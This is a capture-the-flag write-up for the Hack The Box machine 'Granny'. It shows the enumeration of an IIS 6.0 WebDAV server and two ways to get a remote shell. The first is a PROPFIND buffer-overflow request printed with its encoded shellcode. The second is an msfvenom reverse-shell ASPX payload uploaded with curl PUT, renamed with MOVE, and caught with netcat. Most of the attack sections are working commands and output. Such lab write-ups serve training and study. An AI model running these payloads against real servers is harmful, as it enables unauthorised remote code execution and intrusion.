# Granny - Writeup

## Services
```bash
└─$ nmap -sC -sV -p 80 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-06 19:07 EDT
Nmap scan report for 10.129.95.234
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Server Date: Thu, 06 Jul 2023 23:07:33 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
```
Web server IIS 6.0 reveals the machine is using Windows Server 2003. 

WebDAV is enabled on the server.

## WebDAV

We can use davtest to quickly determine what what kind of files we can upload to the server and which are executable:
```bash
└─$ davtest -sendbd auto -url http://$IP
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.129.95.234
********************************************************
NOTE    Random string for this session: 8kMo2lsVoykPK
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.129.95.234/DavTestDir_8kMo2lsVoykPK
********************************************************
 Sending test files
PUT     asp     FAIL
PUT     aspx    FAIL
PUT     php     SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.php
PUT     cfm     SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.cfm
PUT     shtml   FAIL
PUT     pl      SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.pl
PUT     jsp     SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.jsp
PUT     txt     SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.txt
PUT     cgi     FAIL
PUT     html    SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.html
PUT     jhtml   SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.jhtml
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    pl      FAIL
EXEC    jsp     FAIL
EXEC    txt     SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.txt
EXEC    txt     FAIL
EXEC    html    SUCCEED:        http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
********************************************************
 Sending backdoors

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.php
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.cfm
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.pl
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.jsp
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.txt
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.html
PUT File: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.jhtml
Executes: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.txt
Executes: http://10.129.95.234/DavTestDir_8kMo2lsVoykPK/davtest_8kMo2lsVoykPK.html
```
We are able to upload php,cfm,pl,jsp,txt,html, and jhtml files. However, only .txt and .html are executable on the server

We can check what verbs the HTTP server accepts with a curl reqeust:
```bash
└─$ curl -X OPTIONS http://$IP -i
HTTP/1.1 200 OK
Date: Fri, 07 Jul 2023 01:02:47 GMT
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
MS-Author-Via: MS-FP/4.0,DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private
```

We can use cadaver to connect to the HTTP server and use the WebDAV verbs to make changes to the files or upload more. However, html and txt don't provide us a path to rce. HTML could provide a way for LFI with iframes, but we won't be needing that since we know that this machine is running WebDAV and IIS 6.0 we can run the same exploit we used for grandpa.

This is the buffer overflow script used to get a reverse shell on IIS 6.0 that has WebDAV enabled:
```bash
└─$ python2 iis6revShell.py $IP 80 10.10.14.178 6666
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰 夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚 慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃 䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃̀翾Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪 䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```
Catch shell
```bash
└─$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.10.14.178] from (UNKNOWN) [10.129.95.234] 1036
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
This is the same way we got a shell on Grandpa, but there is another way with granny since we are able to upload files with WebDAV.

## Shell with WebDAV 

We determined earlier that the HTTP server accepts uploading multiple file types including .txt, which is what we will be using since it also executes on the server. We are going to upload a .txt file with a PUT curl command and then issue a MOVE curl command to change the file type to aspx, since we know the server is written in that language.

First, we need to create a aspx payload to be executed on the server. We can do this with msfvenom:
```bash
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.178 LPORT=6666 -f aspx -o red.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2731 bytes
Saved as: red.aspx
```
upload the file to the server with the PUT option:
```bash
└─$ curl -X PUT http://10.129.152.117/red3.txt --data-binary @red.aspx
```
Move the file to change its extension to aspx and then execute it server side by requesting it:
```bash
┌──(kali㉿kali)-[~/htb/box/granny]
└─$ curl -X MOVE -H "Destination:http://10.129.152.117/red3.aspx" http://10.129.152.117/red3.txt

┌──(kali㉿kali)-[~/htb/box/granny]
└─$ curl http://10.129.152.117/red3.aspx
```
Catch shell with nc:
```bash
└─$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.10.14.178] from (UNKNOWN) [10.129.152.117] 1273
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>hostname
hostname
granny
```
## privEsc

This box was also vulnerable to the same CVE that Grandpa was since it was Windows Server 2003 and we have a profile with seImpersonatePrivilege privilege. The exploit is called churrasco and its use can be found in the Granpa writeup
